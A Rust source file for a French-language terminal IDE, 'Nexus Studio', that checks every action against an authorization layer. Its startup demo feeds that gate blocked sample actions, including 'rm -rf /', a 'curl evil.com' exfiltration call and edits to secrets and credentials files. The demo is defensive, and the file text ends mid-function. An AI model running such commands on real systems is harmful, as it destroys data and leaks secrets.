//! État applicatif Nexus Studio v2.0 — architecture VS Code-like
//!
//! Onglets multiples, explorateur, palette de commandes, panneau inférieur,
//! thèmes — le tout orchestré AU-DESSUS de la couche souveraine Chaima.
//! Chaque action utilisateur passe par `authorize()` AVANT exécution :
//! Zéro-Path ⇒ l'action n'existe pas (Règle 2), intention chaînée SHA256 (Règle 5).

use crate::chaima::ChaimaLayer;
use crate::editor::{Buffer, Cursor, Language};
use crate::explorer::Explorer;
use crate::llm::MockLLM;
use crate::palette::{ActionId, Palette};
use crate::theme::{Theme, ThemeName};
use std::path::PathBuf;

// ============================================================================
// ÉTATS
// ============================================================================

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Mode {
    Normal,
    Insert,
    Command,
    Explorer,
    Palette,
    Overlay, // tableau de bord Chaima / aide / à propos
    Find,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PanelTab {
    Problems,
    Output,
    Chaima,
    Search,
}

impl PanelTab {
    pub fn label(&self) -> &'static str {
        match self {
            PanelTab::Problems => " PROBLÈMES ",
            PanelTab::Output => " SORTIE ",
            PanelTab::Chaima => " JOURNAL CHAIMA ",
            PanelTab::Search => " RECHERCHE ",
        }
    }
    pub fn next(self) -> Self {
        match self {
            PanelTab::Problems => PanelTab::Output,
            PanelTab::Output => PanelTab::Chaima,
            PanelTab::Chaima => PanelTab::Search,
            PanelTab::Search => PanelTab::Problems,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum OverlayKind {
    None,
    Chaima,
    Help,
    About,
}

#[derive(Debug, Clone)]
pub struct Tab {
    pub buffer: Buffer,
    pub cursor: Cursor,
    pub scroll_row: usize,
}

impl Tab {
    pub fn new(buffer: Buffer) -> Self {
        Tab {
            buffer,
            cursor: Cursor::new(),
            scroll_row: 0,
        }
    }
}

#[derive(Debug, Clone)]
pub struct LogEntry {
    pub timestamp: String,
    pub action: String,
    pub verdict_authorized: bool,
    pub reason: String,
}

#[derive(Debug, Clone)]
pub struct GrepHit {
    pub path: String,
    pub line_no: usize,
    pub text: String,
}

// ============================================================================
// APP
// ============================================================================

pub struct App {
    // Onglets
    pub tabs: Vec<Tab>,
    pub active: usize,

    // Modules VS Code
    pub explorer: Explorer,
    pub palette: Palette,
    pub sidebar_visible: bool,
    pub panel_visible: bool,
    pub panel_tab: PanelTab,

    // Modes d'interaction
    pub mode: Mode,
    pub overlay: OverlayKind,
    pub overlay_scroll: usize,
    pub command_input: String,
    pub find_input: String,
    pub last_find: Option<String>,
    pub pending_g: bool,
    pub pending_d: bool,

    // Recherche projet
    pub grep_hits: Vec<GrepHit>,
    pub grep_selected: usize,
    pub grep_query: String,

    // Couches souveraines
    pub chaima: ChaimaLayer,
    pub llm: MockLLM,

    // Journal & sorties
    pub log: Vec<LogEntry>,
    pub output: Vec<String>,
    pub status_message: String,

    // Apparence
    pub theme_name: ThemeName,
    pub theme: Theme,

    pub should_quit: bool,
    /// Racine projet (dépôt) — utilisée par l'explorateur et :grep
    pub project_root: PathBuf,
}

impl App {
    // ── Construction ────────────────────────────────────────────────────

    pub fn new(initial_path: Option<&std::path::Path>) -> Self {
        // Racine projet : parent du fichier ouvert, sinon cwd
        let project_root = initial_path
            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
            .filter(|p| p.exists())
            .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")));

        let mut tabs: Vec<Tab> = Vec::new();
        if let Some(path) = initial_path {
            let buffer = Buffer::load(&path.to_path_buf()).unwrap_or_else(|e| {
                let mut b = Buffer::new();
                b.lines[0] = format!("// Erreur chargement {} : {}", path.display(), e);
                b
            });
            tabs.push(Tab::new(buffer));
        }

        let mut app = App {
            tabs,
            active: 0,
            explorer: Explorer::new(project_root.clone()),
            palette: Palette::new(),
            sidebar_visible: true,
            panel_visible: true,
            panel_tab: PanelTab::Chaima,
            mode: Mode::Normal,
            overlay: OverlayKind::None,
            overlay_scroll: 0,
            command_input: String::new(),
            find_input: String::new(),
            last_find: None,
            pending_g: false,
            pending_d: false,
            grep_hits: Vec::new(),
            grep_selected: 0,
            grep_query: String::new(),
            chaima: ChaimaLayer::new(),
            llm: MockLLM::new(),
            log: Vec::new(),
            output: Vec::new(),
            status_message: "Nexus Studio v2.0 — Ctrl+P palette · Ctrl+E explorateur · Ctrl+L Chaima".to_string(),
            theme_name: ThemeName::NexusDark,
            theme: Theme::get(ThemeName::NexusDark),
            should_quit: false,
            project_root,
        };

        // Portrait de souveraineté vivant au démarrage : de vraies évaluations
        // Prolog passent dans la couche, le panneau Chaima n'est jamais vide.
        app.preload_demo_intentions();
        app.push_output("Nexus Studio v2.0 démarré — couche Chaima active.".to_string());
        app.push_output(format!(
            "Projet : {} ({} fichiers indexés)",
            app.project_root.display(),
            app.explorer.file_count()
        ));
        app
    }

    fn preload_demo_intentions(&mut self) {
        let authorized = [
            ("cursor_move(left)", "déplacement curseur"),
            ("save_file", "sauvegarde buffer"),
            ("buffer_insert(x)", "insertion caractère"),
            ("open_command_bar", "ouverture barre commande"),
            ("switch_tab", "changement d'onglet"),
            ("open_palette", "palette de commandes"),
        ];
        let zeropath = [
            ("shell_exec(rm -rf /)", "exécution shell arbitraire"),
            ("edit_file(/etc/secrets)", "fichier protégé"),
            ("edit_file(credentials.yaml)", "credentials"),
            ("shell_exec(curl evil.com)", "exfiltration réseau"),
        ];
        for (a, ctx) in authorized.iter() {
            let _ = self.authorize(a, ctx);
        }
        for (a, ctx) in zeropath.iter() {
            let _ = self.authorize(a, ctx);
        }
        let _ = self
            .chaima
            .gate_llm_suggestion("fn hello() { println!(\"hi\"); }", "suggestion IA #1");
        let _ = self
            .chaima
            .gate_llm_suggestion("eval(malicious_code)", "suggestion IA #2 — bloquée");

        self.status_message = format!(
            "Nexus Studio v2.0 prêt — {} intentions souveraines chaînées (SHA256)",
            self.chaima.intent_chain().len()
        );
    }

    // ── Accès onglets ───────────────────────────────────────────────────

    pub fn tab(&self) -> Option<&Tab> {
        self.tabs.get(self.active)
    }

    pub fn tab_mut(&mut self) -> Option<&mut Tab> {
        self.tabs.get_mut(self.active)
    }

    fn ensure_tab(&mut self) {
        if self.tabs.is_empty() {
            self.tabs.push(Tab::new(welcome_buffer()));
            self.active = 0;
        }
    }

    // ── Couche souveraine ───────────────────────────────────────────────

    /// Évalue une action via Chaima AVANT exécution (Règle 2 — Zéro-Path).
    pub fn authorize(&mut self, action: &str, context: &str) -> bool {
        let verdict = self.chaima.evaluate_action(action, context);
        let authorized = verdict.is_authorized();

        self.log.push(LogEntry {
            timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
            action: action.to_string(),
            verdict_authorized: authorized,
            reason: verdict.reason().to_string(),
        });
        if self.log.len() > 500 {
            let drop = self.log.len() - 500;
            self.log.drain(0..drop);
        }

        if authorized {
            self.status_message = format!("✓ {} — chemin souverain vérifié", action);
        } else {
            self.status_message = format!("⊘ {} — Zéro-Path : action inexistante", action);
        }
        authorized
    }

    pub fn push_output(&mut self, line: String) {
        self.output.push(line);
        if self.output.len() > 500 {
            let drop = self.output.len() - 500;
            self.output.drain(0..drop);
        }
    }

    // ── Dispatch clavier ────────────────────────────────────────────────

    pub fn handle_key(&mut self, code: &str, ctrl: bool, alt: bool) {
        // Les raccourcis globaux fonctionnent partout, comme dans VS Code
        if ctrl {
            match code {
                "p" => {
                    if self.authorize("open_palette", "palette de commandes") {
                        self.mode = Mode::Palette;
                        self.palette.open();
                    }
                    return;
                }
                "e" => {
                    if self.authorize("toggle_explorer", "explorateur de fichiers") {
                        self.explorer.visible = !self.explorer.visible;
                        self.mode = if self.explorer.visible { Mode::Explorer } else { Mode::Normal };
                    }
                    return;
                }
                "l" => {
                    self.overlay = if self.overlay == OverlayKind::Chaima {
                        OverlayKind::None
                    } else {
                        OverlayKind::Chaima
                    };
                    self.mode = if self.overlay == OverlayKind::None { Mode::Normal } else { Mode::Overlay };
                    self.overlay_scroll = 0;
                    return;
                }
                "b" => {
                    if self.authorize("toggle_sidebar", "barre latérale") {
                        self.sidebar_visible = !self.sidebar_visible;
                    }
                    return;
                }
                "j" => {
                    if self.authorize("toggle_panel", "panneau inférieur") {
                        self.panel_visible = !self.panel_visible;
                    }
                    return;
                }
                "s" => {
                    self.cmd_save(None);
                    return;
                }
                _ => {}
            }
        }
        if alt {
            match code {
                "left" => {
                    self.switch_tab(-1);
                    return;
                }
                "right" => {
                    self.switch_tab(1);
                    return;
                }
                "j" if self.mode == Mode::Normal || self.mode == Mode::Insert => {
                    self.move_line_down();
                    return;
                }
                "k" if self.mode == Mode::Normal || self.mode == Mode::Insert => {
                    self.move_line_up();
                    return;
                }
                "up" => self.cycle_grep_hit(-1),
                "down" => self.cycle_grep_hit(1),
                _ => {}
            }
            if matches!(code, "up" | "down") {
                return;
            }
        }

        match self.mode {
            Mode::Normal => self.handle_normal(code),
            Mode::Insert => self.handle_insert(code),
            Mode::Command => self.handle_command_key(code),
            Mode::Explorer => self.handle_explorer_key(code),
            Mode::Palette => self.handle_palette_key(code),
            Mode::Overlay => self.handle_overlay_key(code),
            Mode::Find => self.handle_find_key(code),
        }
    }

    // ── Mode NORMAL ─────────────────────────────────────────────────────

    fn handle_normal(&mut self, code: &str) {
        // Séquences à deux touches : gt/gT (onglets), dd (suppr ligne), gg (début)
        if self.pending_g {
            self.pending_g = false;
            match code {
                "t" => return self.switch_tab(1),
                "T" => return self.switch_tab(-1),
                "g" => {
                    if let Some(t) = self.tab_mut() {
                        t.cursor.row = 0;
                        t.cursor.col = 0;
                    }
                    return;
                }
                _ => {}
            }
        }
        if self.pending_d {
            self.pending_d = false;
            if code == "d" {
                self.delete_current_line();
                return;
            }
        }

        match code {
            "g" => self.pending_g = true,
            "d" => self.pending_d = true,
            "h" => {
                if self.authorize("cursor_move(left)", "déplacement") {
                    if let Some((t, buf)) = self.tab_and_buffer() {
                        t.cursor.move_left(&buf);
                    }
                }
            }
            "l" => {
                if self.authorize("cursor_move(right)", "déplacement") {
                    if let Some((t, buf)) = self.tab_and_buffer() {
                        t.cursor.move_right(&buf);
                    }
                }
            }
            "k" => {
                if self.authorize("cursor_move(up)", "déplacement") {
                    if let Some((t, buf)) = self.tab_and_buffer() {
                        t.cursor.move_up(&buf);
                    }
                }
            }
            "j" => {
                if self.authorize("cursor_move(down)", "déplacement") {
                    if let Some((t, buf)) = self.tab_and_buffer() {
                        t.cursor.move_down(&buf);
                    }
                }
            }
            "0" => {
                if self.authorize("cursor_move(line_start)", "déplacement") {
                    if let Some(t) = self.tab_mut() {
                        t.cursor.move_line_start();
                    }
                }
            }
            "$" => {
                if self.authorize("cursor_move(line_end)", "déplacement") {
                    let buf = self.tabs[self.active].buffer.clone();
                    self.tabs[self.active].cursor.move_line_end(&buf);
                }
            }
            "G" => {
                if self.authorize("cursor_move(buffer_end)", "déplacement") {
                    let buf = self.tabs[self.active].buffer.clone();
                    let t = &mut self.tabs[self.active];
                    t.cursor.row = buf.line_count().saturating_sub(1);
                    t.cursor.move_line_end(&buf);
                }
            }
            "x" => {
                if self.authorize("buffer_delete", "suppression caractère") {
                    let (row, col) = {
                        let t = &self.tabs[self.active];
                        (t.cursor.row, t.cursor.col)
                    };
                    self.tabs[self.active].buffer.delete_char(row, col);
                }
            }
            "i" => {
                if self.authorize("insert_mode", "entrée en insertion") {
                    self.mode = Mode::Insert;
                }
            }
            "o" => {
                self.open_line_below();
            }
            "O" => {
                self.open_line_above();
            }
            ":" => {
                if self.authorize("open_command_bar", "barre de commande") {
                    self.mode = Mode::Command;
                    self.command_input.clear();
                }
            }
            "/" => {
                if self.authorize("find_in_buffer", "recherche buffer") {
                    self.mode = Mode::Find;
                    self.find_input.clear();
                }
            }
            "n" => self.find_occurrence(1),
            "N" => self.find_occurrence(-1),
            "q" => {
                // vim q seul ne fait rien — sécurité
            }
            "w" => self.cmd_save(None),
            _ => {}
        }
    }

    // ── Mode INSERT ─────────────────────────────────────────────────────

    fn handle_insert(&mut self, code: &str) {
        match code {
            "esc" => {
                self.mode = Mode::Normal;
                self.status_message = "Mode normal".to_string();
            }
            "enter" => {
                if self.authorize("buffer_insert(newline)", "nouvelle ligne") {
                    let (row, col) = {
                        let t = &self.tabs[self.active];
                        (t.cursor.row, t.cursor.col)
                    };
                    self.tabs[self.active].buffer.insert_newline(row, col);
                    self.tabs[self.active].cursor.row += 1;
                    self.tabs[self.active].cursor.col = 0;
                }
            }
            "backspace" => {
                let t = &self.tabs[self.active];
                let (row, col) = (t.cursor.row, t.cursor.col);
                if col > 0 {
                    self.tabs[self.active].buffer.delete_char(row, col - 1);
                    self.tabs[self.active].cursor.col -= 1;
                } else if row > 0 {
                    let prev_len = self.tabs[self.active].buffer.line(row - 1).len();
                    self.tabs[self.active].buffer.delete_char(row - 1, prev_len);
                    self.tabs[self.active].cursor.row -= 1;
                    self.tabs[self.active].cursor.col = prev_len;
                }
            }
            "tab" => {
                if self.authorize("buffer_insert(indent)", "indentation") {
                    let (row, col) = {
                        let t = &self.tabs[self.active];
                        (t.cursor.row, t.cursor.col)
                    };
                    self.tabs[self.active].buffer.insert_str(row, col, "  ");
                    self.tabs[self.active].cursor.col += 2;
                }
            }
            _ => {
                if code.len() == 1 {
                    let c = code.chars().next().unwrap();
                    if self.authorize("buffer_insert(x)", "insertion caractère") {
                        let (row, col) = {
                            let t = &self.tabs[self.active];
                            (t.cursor.row, t.cursor.col)
                        };
                        self.tabs[self.active].buffer.insert_char(row, col, c);
                        self.tabs[self.active].cursor.col += c.len_utf8();
                    }
                }
            }
        }
    }

    // ── Mode COMMANDE (barre :) ─────────────────────────────────────────

    fn handle_command_key(&mut self, code: &str) {
        match code {
            "esc" => {
                self.mode = Mode::Normal;
                self.command_input.clear();
            }
            "enter" => {
                let cmd = self.command_input.clone();
                self.command_input.clear();
                self.mode = Mode::Normal;
                self.execute_command(&cmd);
            }
            "backspace" => {
                self.command_input.pop();
            }
            _ => {
                if code.len() == 1 {
                    self.command_input.push_str(code);
                }
            }
        }
    }

    /// Exécute une commande de la barre `:` — le vrai "shell" de l'IDE.
    pub fn execute_command(&mut self, raw: &str) {
        let raw = raw.trim();
        if raw.is_empty() {
            return;
        }
        // Numéro pur = goto ligne
        if let Ok(n) = raw.parse::<usize>() {
            if n >= 1 {
                if self.authorize("goto_line", &format!("ligne {}", n)) {
                    self.ensure_tab();
                    let target = (n - 1).min(self.tabs[self.active].buffer.line_count() - 1);
                    self.tabs[self.active].cursor.row = target;
                    self.tabs[self.active].cursor.col = 0;
                    self.status_message = format!("Ligne {}", n);
                }
                return;
            }
        }

        let mut parts = raw.splitn(2, ' ');
        let head = parts.next().unwrap_or("");
        let arg = parts.next().unwrap_or("").trim().to_string();

        match head {
            "w" => self.cmd_save(if arg.is_empty() { None } else { Some(arg) }),
            "wq" | "x" => {
                self.cmd_save(None);
                self.cmd_close_tab_or_quit();
            }
            "q" => self.cmd_close_tab_or_quit(),
            "q!" => self.should_quit = true,
            "qa" | "qa!" => self.should_quit = true,
            "bd" => self.cmd_close_tab(),
            "bn" => self.switch_tab(1),
            "bp" => self.switch_tab(-1),
            "e" => {
                if arg.is_empty() {
                    self.cmd_new_buffer();
                } else {
                    self.cmd_open_file(&arg);
                }
            }
            "chaima" => {
                self.overlay = OverlayKind::Chaima;
                self.mode = Mode::Overlay;
            }
            "llm" => self.cmd_llm_suggest(),
            "stats" => self.cmd_llm_stats(),
            "test" => self.cmd_chaima_test(),
            "chain" => {
                self.cmd_chaima_chain();
            }
            "grep" => {
                if arg.is_empty() {
                    self.push_output("usage : :grep <motif>".to_string());
                } else {
                    self.cmd_grep(&arg);
                }
            }
            "theme" => {
                if arg.is_empty() {
                    self.cycle_theme();
                } else if let Some(t) = ThemeName::from_str(&arg) {
                    self.set_theme(t);
                } else {
                    let names: Vec<&str> = ThemeName::all().iter().map(|(n, _)| *n).collect();
                    self.push_output(format!("thème inconnu — disponibles : {}", names.join(", ")));
                }
            }
            "cd" => {
                if !arg.is_empty() {
                    let p = resolve_path(&arg, &self.project_root);
                    if p.is_dir() {
                        self.explorer.set_root(p.clone());
                        self.project_root = p;
                        self.push_output(format!("racine projet : {}", self.project_root.display()));
                    } else {
                        self.push_output(format!("répertoire introuvable : {}", arg));
                    }
                }
            }
            "help" | "keys" => {
                self.overlay = OverlayKind::Help;
                self.mode = Mode::Overlay;
                self.overlay_scroll = 0;
            }
            "about" => {
                self.overlay = OverlayKind::About;
                self.mode = Mode::Overlay;
                self.overlay_scroll = 0;
            }
            "prolog" => self.cmd_prolog_demo(),
            "trim" => self.trim_trailing(),
            "dup" => self.duplicate_line(),
            _ => {
                self.status_message = format!("✗ commande inconnue : {}", raw);
                self.push_output(format!("commande inconnue : {} — :help pour l'aide", raw));
            }
        }
    }

    // ── Mode EXPLORATEUR ────────────────────────────────────────────────

    fn handle_explorer_key(&mut self, code: &str) {
        match code {
            "esc" | "e" => self.mode = Mode::Normal,
            "j" | "down" => self.explorer.move_down(1),
            "k" | "up" => self.explorer.move_up(1),
            "g" => self.explorer.move_top(),
            "G" => self.explorer.move_bottom(),
            "enter" | "space" | "l" => {
                let entry = match self.explorer.selected_entry() {
                    Some(e) => e.clone(),
                    None => return,
                };
                if entry.is_dir {
                    let _ = self.explorer.toggle_expanded();
                } else {
                    self.open_file_path(&entry.path);
                }
            }
            "h" => {
                // replier si répertoire sélectionné, sinon remonter au parent
                let is_dir_expanded = self
                    .explorer
                    .selected_entry()
                    .map(|e| e.is_dir && e.expanded)
                    .unwrap_or(false);
                if is_dir_expanded {
                    let _ = self.explorer.toggle_expanded();
                } else {
                    self.explorer.move_up(1);
                }
            }
            _ => {}
        }
    }

    // ── Mode PALETTE (Ctrl+P) ───────────────────────────────────────────

    fn handle_palette_key(&mut self, code: &str) {
        match code {
            "esc" => {
                self.palette.close();
                self.mode = Mode::Normal;
            }
            "up" => self.palette.move_up(),
            "down" => self.palette.move_down(),
            "enter" => {
                let action = self.palette.selected_command().map(|c| (c.id, c.title.clone()));
                if let Some((id, title)) = action {
                    self.palette.close();
                    self.mode = Mode::Normal;
                    self.execute_action(id, &title);
                }
            }
            "backspace" => self.palette.backspace(),
            _ => {
                if code.len() == 1 {
                    let c = code.chars().next().unwrap();
                    self.palette.push_char(c);
                }
            }
        }
    }

    /// Exécute une commande de la palette via son identifiant.
    pub fn execute_action(&mut self, id: ActionId, title: &str) {
        if !self.authorize("palette_command", title) {
            return;
        }
        match id {
            ActionId::Save => self.cmd_save(None),
            ActionId::SaveAs => {
                self.mode = Mode::Command;
                self.command_input = "w ".to_string();
            }
            ActionId::CloseTab => self.cmd_close_tab(),
            ActionId::NewFile => self.cmd_new_buffer(),
            ActionId::OpenExplorer => {
                self.explorer.visible = true;
                self.mode = Mode::Explorer;
            }
            ActionId::RevealInExplorer => {
                if let Some(t) = self.tab() {
                    if let Some(p) = t.buffer.path.clone() {
                        self.explorer.visible = true;
                        self.explorer.reveal(&p);
                        self.mode = Mode::Explorer;
                    }
                }
            }
            ActionId::NextTab => self.switch_tab(1),
            ActionId::PrevTab => self.switch_tab(-1),
            ActionId::GotoLine => {
                self.mode = Mode::Command;
                self.command_input.clear();
            }
            ActionId::ToggleSidebar => self.sidebar_visible = !self.sidebar_visible,
            ActionId::ToggleBottomPanel => self.panel_visible = !self.panel_visible,
            ActionId::CycleTheme => self.cycle_theme(),
            ActionId::ThemeNexusDark => self.set_theme(ThemeName::NexusDark),
            ActionId::ThemeNord => self.set_theme(ThemeName::Nord),
            ActionId::ThemeGruvbox => self.set_theme(ThemeName::Gruvbox),
            ActionId::ThemeLight => self.set_theme(ThemeName::Light),
            ActionId::ChaimaDashboard => {
                self.overlay = OverlayKind::Chaima;
                self.mode = Mode::Overlay;
            }
            ActionId::ChaimaEvaluateTest => self.cmd_chaima_test(),
            ActionId::ChaimaShowChain => self.cmd_chaima_chain(),
            ActionId::ChaimaMetrics => {
                let (a, z) = self.chaima.metrics();
                self.push_output(format!(
                    "Chaima : {} autorisées ✓ · {} Zéro-Path ⊘ · {} intentions chaînées · Δ=0",
                    a,
                    z,
                    self.chaima.intent_chain().len()
                ));
                self.panel_tab = PanelTab::Output;
                self.panel_visible = true;
            }
            ActionId::LlmSuggest => self.cmd_llm_suggest(),
            ActionId::LlmStats => self.cmd_llm_stats(),
            ActionId::FindInBuffer => {
                self.mode = Mode::Find;
                self.find_input.clear();
            }
            ActionId::FindNext => self.find_occurrence(1),
            ActionId::FindPrev => self.find_occurrence(-1),
            ActionId::GrepProject => {
                self.mode = Mode::Command;
                self.command_input = "grep ".to_string();
            }
            ActionId::PrologDemo => self.cmd_prolog_demo(),
            ActionId::DeleteLine => self.delete_current_line(),
            ActionId::DuplicateLine => self.duplicate_line(),
            ActionId::MoveLineUp => self.move_line_up(),
            ActionId::MoveLineDown => self.move_line_down(),
            ActionId::TrimTrailingWhitespace => self.trim_trailing(),
            ActionId::SelectAll => {
                if let Some(t) = self.tab_mut() {
                    t.cursor.row = 0;
                    t.cursor.col = 0;
                }
                self.status_message = "Curseur en tête de buffer (sélection visuelle non implémentée)".to_string();
            }
            ActionId::HelpKeys => {
                self.overlay = OverlayKind::Help;
                self.mode = Mode::Overlay;
                self.overlay_scroll = 0;
            }
            ActionId::About => {
                self.overlay = OverlayKind::About;
                self.mode = Mode::Overlay;
                self.overlay_scroll = 0;
            }
            ActionId::Quit => self.cmd_close_tab_or_quit(),
        }
    }

    // ── Mode OVERLAY (Chaima / aide / à propos) ─────────────────────────

    fn handle_overlay_key(&mut self, code: &str) {
        match code {
            "esc" | "q" => {
                self.overlay = OverlayKind::None;
                self.mode = Mode::Normal;
            }
            "j" | "down" => self.overlay_scroll += 3,
            "k" | "up" => self.overlay_scroll = self.overlay_scroll.saturating_sub(3),
            "t" if self.overlay == OverlayKind::Chaima => self.cmd_chaima_test(),
            "c" if self.overlay == OverlayKind::Chaima => self.cmd_chaima_chain(),
            _ => {}
        }
    }

    // ── Mode FIND (/) ───────────────────────────────────────────────────

    fn handle_find_key(&mut self, code: &str) {
        match code {
            "esc" => {
                self.find_input.clear();
                self.mode = Mode::Normal;
            }
            "enter" => {
                if !self.find_input.is_empty() {
                    self.last_find = Some(self.find_input.clone());
                    self.find_occurrence(1);
                }
                self.mode = Mode::Normal;
            }
            "backspace" => {
                self.find_input.pop();
            }
            _ => {
                if code.len() == 1 {
                    self.find_input.push_str(code);
                }
            }
        }
    }

    pub fn find_occurrence(&mut self, direction: i32) {
        let needle = match &self.last_find {
            Some(n) => n.clone(),
            None => {
                self.status_message = "Aucune recherche précédente (/)".to_string();
                return;
            }
        };
        self.ensure_tab();
        let buf = self.tabs[self.active].buffer.clone();
        let (mut row, mut col) = {
            let t = &self.tabs[self.active];
            (t.cursor.row, t.cursor.col)
        };
        let count = buf.line_count();
        if count == 0 {
            return;
        }
        let n_lower = needle.to_lowercase();
        // Bornage : assez de pas pour faire le tour complet du buffer
        let total_steps: usize = buf.lines.iter().map(|l| l.chars().count() + 1).sum();

        for _ in 0..=total_steps {
            // avancer/reculer d'au moins un caractère
            if direction > 0 {
                col += 1;
                if col > buf.line(row).len() {
                    row = (row + 1) % count;
                    col = 0;
                }
            } else {
                if col == 0 {
                    row = (row + count - 1) % count;
                    col = buf.line(row).len();
                } else {
                    col -= 1;
                }
            }
            let line = buf.line(row).to_lowercase();
            let found_col = if direction > 0 {
                if col <= line.len() {
                    line[col.min(line.len())..].find(&n_lower).map(|p| p + col)
                } else {
                    None
                }
            } else {
                line[..col.min(line.len())].rfind(&n_lower)
            };
            if let Some(fc) = found_col {
                self.tabs[self.active].cursor.row = row;
                self.tabs[self.active].cursor.col = fc;
                self.status_message = format!("trouvé : « {} » ligne {}", needle, row + 1);
                return;
            }
        }
        self.status_message = format!("« {} » introuvable dans le buffer", needle);
    }

    // ── ACTIONS CONCRÈTES ───────────────────────────────────────────────

    fn tab_and_buffer(&mut self) -> Option<(&mut Tab, Buffer)> {
        let buf = self.tabs.get(self.active)?.buffer.clone();
        self.tabs.get_mut(self.active).map(|t| (t, buf))
    }

    pub fn cmd_save(&mut self, path: Option<String>) {
        self.ensure_tab();
        let action = if path.is_some() { "save_file_as" } else { "save_file" };
        if !self.authorize(action, "écriture disque") {
            return;
        }
        let result = match path {
            Some(p) => {
                let full = resolve_path(&p, &self.project_root);
                self.tabs[self.active].buffer.save_as(full)
            }
            None => {
                if self.tabs[self.active].buffer.path.is_none() {
                    // buffer sans nom → :w chemin demandé
                    self.mode = Mode::Command;
                    self.command_input = "w ".to_string();
                    self.status_message = "Buffer sans nom — précise :w <chemin>".to_string();
                    return;
                }
                self.tabs[self.active].buffer.save()
            }
        };
        match result {
            Ok(()) => {
                let name = self.tabs[self.active].buffer.filename();
                self.status_message = format!("✓ sauvegardé : {}", name);
                self.push_output(format!("[SAVE] {} — autorisé par Chaima, écrit", name));
                self.explorer.reload_root();
            }
            Err(e) => {
                self.status_message = format!("✗ {}", e);
                self.push_output(format!("[ERREUR] {}", e));
            }
        }
    }

    pub fn cmd_close_tab_or_quit(&mut self) {
        if self.tabs.is_empty() {
            self.should_quit = true;
        } else {
            self.cmd_close_tab();
        }
    }

    pub fn cmd_close_tab(&mut self) {
        if !self.authorize("close_tab", "fermeture onglet") {
            return;
        }
        if self.tabs.is_empty() {
            self.should_quit = true;
            return;
        }
        self.tabs.remove(self.active);
        if self.tabs.is_empty() {
            self.status_message = "Dernier onglet fermé — :q pour quitter".to_string();
        } else if self.active >= self.tabs.len() {
            self.active = self.tabs.len() - 1;
        }
    }

    pub fn cmd_new_buffer(&mut self) {
        if !self.authorize("new_buffer", "buffer vierge") {
            return;
        }
        self.tabs.push(Tab::new(Buffer::new()));
        self.active = self.tabs.len() - 1;
        self.mode = Mode::Insert;
        self.status_message = "Nouveau buffer — i/Esc, :w <chemin> pour sauvegarder".to_string();
    }

    pub fn cmd_open_file(&mut self, arg: &str) {
        let p = resolve_path(arg, &self.project_root);
        self.open_file_path(&p);
    }

    pub fn open_file_path(&mut self, path: &PathBuf) {
        if !self.authorize("read_file", &format!("ouverture {}", path.display())) {
            return;
        }
        // Déjà ouvert ? → activer l'onglet
        if let Some(pos) = self.tabs.iter().position(|t| t.buffer.path.as_deref() == Some(path)) {
            self.active = pos;
            self.explorer.reveal(path);
            self.status_message = format!("onglet actif : {}", path.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default());
            return;
        }
        match Buffer::load(path) {
            Ok(buf) => {
                self.tabs.push(Tab::new(buf));
                self.active = self.tabs.len() - 1;
                if self.mode == Mode::Explorer {
                    self.mode = Mode::Normal;
                }
                self.push_output(format!("[OPEN] {}", path.display()));
                self.explorer.reveal(path);
            }
            Err(e) => {
                self.status_message = format!("✗ {}", e);
                self.push_output(format!("[ERREUR] {}", e));
            }
        }
    }

    pub fn switch_tab(&mut self, dir: i32) {
        if self.tabs.len() < 2 {
            return;
        }
        if !self.authorize("switch_tab", "changement d'onglet") {
            return;
        }
        let n = self.tabs.len() as i32;
        let cur = self.active as i32;
        self.active = ((cur + dir).rem_euclid(n)) as usize;
        let name = self.tabs[self.active].buffer.filename();
        self.status_message = format!("onglet : {}", name);
    }

    fn delete_current_line(&mut self) {
        if !self.authorize("buffer_delete_line", "suppression ligne") {
            return;
        }
        self.ensure_tab();
        let row = self.tabs[self.active].cursor.row;
        self.tabs[self.active].buffer.delete_line(row);
        let max = self.tabs[self.active].buffer.line_count().saturating_sub(1);
        if self.tabs[self.active].cursor.row > max {
            self.tabs[self.active].cursor.row = max;
        }
        self.tabs[self.active].cursor.move_line_start();
    }

    fn duplicate_line(&mut self) {
        if !self.authorize("buffer_duplicate_line", "duplication ligne") {
            return;
        }
        self.ensure_tab();
        let row = self.tabs[self.active].cursor.row;
        let len = self.tabs[self.active].buffer.line(row).len();
        self.tabs[self.active].buffer.insert_newline(row, len);
        let line = self.tabs[self.active].buffer.line(row).to_string();
        self.tabs[self.active].buffer.insert_str(row + 1, 0, &line);
        self.tabs[self.active].cursor.row += 1;
    }

    fn move_line_up(&mut self) {
        if !self.authorize("buffer_move_line", "déplacement ligne") {
            return;
        }
        self.ensure_tab();
        let row = self.tabs[self.active].cursor.row;
        if row == 0 {
            return;
        }
        let line = self.tabs[self.active].buffer.lines.remove(row);
        self.tabs[self.active].buffer.lines.insert(row - 1, line);
        self.tabs[self.active].cursor.row -= 1;
    }

    fn move_line_down(&mut self) {
        if !self.authorize("buffer_move_line", "déplacement ligne") {
            return;
        }
        self.ensure_tab();
        let row = self.tabs[self.active].cursor.row;
        if row + 1 >= self.tabs[self.active].buffer.line_count() {
            return;
        }
        let line = self.tabs[self.active].buffer.lines.remove(row);
        self.tabs[self.active].buffer.lines.insert(row + 1, line);
        self.tabs[self.active].cursor.row += 1;
    }

    fn trim_trailing(&mut self) {
        if !self.authorize("buffer_trim", "nettoyage espaces") {
            return;
        }
        self.ensure_tab();
        let n = self.tabs[self.active].buffer.lines.len();
        for i in 0..n {
            let trimmed = self.tabs[self.active].buffer.lines[i].trim_end().to_string();
            self.tabs[self.active].buffer.lines[i] = trimmed;
        }
        self.tabs[self.active].buffer.modified = true;
        self.push_output(format!("[TRIM] espaces en fin de ligne supprimés ({} lignes)", n));
    }

    fn open_line_below(&mut self) {
        if !self.authorize("buffer_insert(newline)", "nouvelle ligne") {
            return;
        }
        self.ensure_tab();
        let row = self.tabs[self.active].cursor.row;
        let len = self.tabs[self.active].buffer.line(row).len();
        self.tabs[self.active].buffer.insert_newline(row, len);
        self.tabs[self.active].cursor.row += 1;
        self.tabs[self.active].cursor.col = 0;
        self.mode = Mode::Insert;
    }

    fn open_line_above(&mut self) {
        if !self.authorize("buffer_insert(newline)", "nouvelle ligne") {
            return;
        }
